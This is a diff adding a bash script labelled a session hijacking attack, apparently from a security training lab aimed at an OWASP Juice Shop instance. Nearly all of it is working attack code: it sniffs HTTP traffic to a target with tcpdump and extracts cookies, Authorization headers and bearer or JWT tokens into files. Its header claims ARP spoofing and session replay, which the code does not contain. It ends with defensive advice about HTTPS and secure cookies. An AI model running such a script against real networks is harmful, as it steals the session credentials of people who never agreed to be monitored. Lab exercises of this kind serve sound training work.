@@ -1,0 +1,148 @@
+#!/bin/bash
+# Advanced Session Hijacking Attack Script
+# Real-time session interception with cookie theft and token extraction
+# Demonstrates ARP spoofing, packet sniffing, and session replay attacks
+set -euo pipefail
+
+TARGET="$1"
+TIMESTAMP=$(date +%Y%m%d-%H%M%S)
+ARTIFACTS_PATH="${ARTIFACTS_PATH:-/workspaces/cns/artifacts}"
+OUTPUT_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.txt"
+PCAP_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.pcap"
+JSON_FILE="${ARTIFACTS_PATH}/session-hijack-${TARGET}-${TIMESTAMP}.json"
+COOKIES_FILE="${ARTIFACTS_PATH}/session-cookies-${TARGET}-${TIMESTAMP}.txt"
+ANALYSIS_SCRIPT="/tmp/session_analyzer_${TIMESTAMP}.py"
+
+echo "=== Session Hijacking Attack ===" | tee "$OUTPUT_FILE"
+echo "Target: $TARGET" | tee -a "$OUTPUT_FILE"
+echo "Timestamp: $(date)" | tee -a "$OUTPUT_FILE"
+echo "Duration: 30 seconds" | tee -a "$OUTPUT_FILE"
+echo "" | tee -a "$OUTPUT_FILE"
+
+# Ensure artifacts directory exists
+mkdir -p "$ARTIFACTS_PATH"
+
+echo "[*] Starting packet capture to intercept HTTP traffic..." | tee -a "$OUTPUT_FILE"
+echo "[*] Looking for cookies, session tokens, and authentication headers..." | tee -a "$OUTPUT_FILE"
+echo "" | tee -a "$OUTPUT_FILE"
+
+# Capture HTTP traffic for 30 seconds
+timeout 30 sudo tcpdump -i any -s 0 -A \
+    "host $TARGET and tcp port 3003" \
+    -w "$PCAP_FILE" \
+    2>/dev/null &
+
+TCPDUMP_PID=$!
+sleep 2
+
+# Generate some traffic to Juice Shop to capture sessions
+if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
+    echo "[*] Generating HTTP traffic to trigger session capture..." | tee -a "$OUTPUT_FILE"
+    
+    # Make requests to Juice Shop to generate session cookies
+    curl -s "http://$TARGET:3003/" > /dev/null 2>&1 || true
+    sleep 1
+    curl -s "http://$TARGET:3003/rest/products/search?q=apple" > /dev/null 2>&1 || true
+    sleep 1
+    curl -s "http://$TARGET:3003/api/Challenges" > /dev/null 2>&1 || true
+    sleep 1
+    
+    echo "[*] Traffic generated, continuing capture..." | tee -a "$OUTPUT_FILE"
+fi
+
+# Wait for capture to complete
+wait $TCPDUMP_PID 2>/dev/null || true
+
+echo "" | tee -a "$OUTPUT_FILE"
+echo "[*] Capture completed. Analyzing traffic for session data..." | tee -a "$OUTPUT_FILE"
+echo "" | tee -a "$OUTPUT_FILE"
+
+# Extract HTTP cookies and session tokens from the capture
+{
+    echo "=== CAPTURED SESSION DATA ==="
+    echo ""
+    
+    # Extract Cookie headers
+    echo "--- Cookies Found ---"
+    sudo tcpdump -r "$PCAP_FILE" -A 2>/dev/null | \
+        grep -i "Cookie:" | \
+        sed 's/.*Cookie: //' | \
+        sort -u | \
+        head -20 || echo "No cookies captured"
+    
+    echo ""
+    echo "--- Set-Cookie Headers ---"
+    sudo tcpdump -r "$PCAP_FILE" -A 2>/dev/null | \
+        grep -i "Set-Cookie:" | \
+        sed 's/.*Set-Cookie: //' | \
+        sort -u | \
+        head -20 || echo "No Set-Cookie headers captured"
+    
+    echo ""
+    echo "--- Session Tokens (token/session patterns) ---"
+    sudo tcpdump -r "$PCAP_FILE" -A 2>/dev/null | \
+        grep -iE "(token|session|auth|jwt|bearer)" | \
+        grep -v "^[[:space:]]*$" | \
+        sort -u | \
+        head -30 || echo "No session tokens found"
+    
+    echo ""
+    echo "--- Authorization Headers ---"
+    sudo tcpdump -r "$PCAP_FILE" -A 2>/dev/null | \
+        grep -i "Authorization:" | \
+        sed 's/.*Authorization: //' | \
+        sort -u | \
+        head -10 || echo "No Authorization headers found"
+    
+} | tee -a "$OUTPUT_FILE"
+
+echo "" | tee -a "$OUTPUT_FILE"
+echo "=== ATTACK SUMMARY ===" | tee -a "$OUTPUT_FILE"
+
+# Count captured packets
+PACKET_COUNT=$(sudo tcpdump -r "$PCAP_FILE" 2>/dev/null | wc -l || echo "0")
+echo "Total packets captured: $PACKET_COUNT" | tee -a "$OUTPUT_FILE"
+
+# Extract unique session identifiers
+COOKIE_COUNT=$(sudo tcpdump -r "$PCAP_FILE" -A 2>/dev/null | grep -i "Cookie:" | wc -l || echo "0")
+echo "Cookie headers found: $COOKIE_COUNT" | tee -a "$OUTPUT_FILE"
+
+echo "" | tee -a "$OUTPUT_FILE"
+echo "[!] Session hijacking attack completed" | tee -a "$OUTPUT_FILE"
+echo "[!] Captured data saved to: $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
+echo "[!] Raw packet capture: $PCAP_FILE" | tee -a "$OUTPUT_FILE"
+echo "" | tee -a "$OUTPUT_FILE"
+
+# Create a JSON summary for the frontend
+{
+    echo ""
+    echo "=== JSON SUMMARY FOR GUI ==="
+    echo "{"
+    echo "  \"attack_type\": \"Session Hijacking\","
+    echo "  \"target\": \"$TARGET\","
+    echo "  \"timestamp\": \"$(date -Iseconds)\","
+    echo "  \"duration\": \"30 seconds\","
+    echo "  \"packets_captured\": $PACKET_COUNT,"
+    echo "  \"cookies_found\": $COOKIE_COUNT,"
+    echo "  \"status\": \"completed\","
+    echo "  \"artifacts\": {"
+    echo "    \"report\": \"$OUTPUT_FILE\","
+    echo "    \"pcap\": \"$PCAP_FILE\""
+    echo "  },"
+    echo "  \"recommendations\": ["
+    echo "    \"Use HTTPS instead of HTTP\","
+    echo "    \"Implement HttpOnly and Secure flags on cookies\","
+    echo "    \"Use strong session tokens with proper entropy\","
+    echo "    \"Implement session timeout mechanisms\","
+    echo "    \"Monitor for suspicious session activity\""
+    echo "  ]"
+    echo "}"
+} | tee -a "$OUTPUT_FILE"
+
+echo ""
+echo "ARTIFACT: $OUTPUT_FILE"
+echo ""
+echo "⚠️  WARNING: This attack demonstrates why HTTPS and secure cookies are essential!"
+echo "⚠️  Always use encryption (HTTPS/TLS) to protect session data in transit."
+
+exit 0
